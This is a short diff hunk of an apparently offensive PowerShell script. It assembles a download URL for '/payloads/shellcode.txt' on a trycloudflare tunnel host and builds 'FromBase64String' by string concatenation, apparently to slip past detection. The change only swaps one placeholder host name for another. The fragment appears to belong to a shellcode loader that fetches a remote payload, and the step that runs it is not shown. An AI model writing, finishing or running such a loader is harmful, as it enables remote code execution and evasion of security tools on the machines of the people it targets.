@@ -8,7 +8,7 @@ $fb="From"+"Base64"+"String"
 # URL split
 $h="https://"
 $t=[Environment]::GetEnvironmentVariable("T","Process")
-if(-not $t){$t="yourhost.trycloudflare.com"}
+if(-not $t){$t="CHANGE-ME.trycloudflare.com"}
 $p="/payloads/shellcode.txt"
 $k="?key="+[Environment]::GetEnvironmentVariable("K","Process")
 if($k -eq "?key="){$k=""}
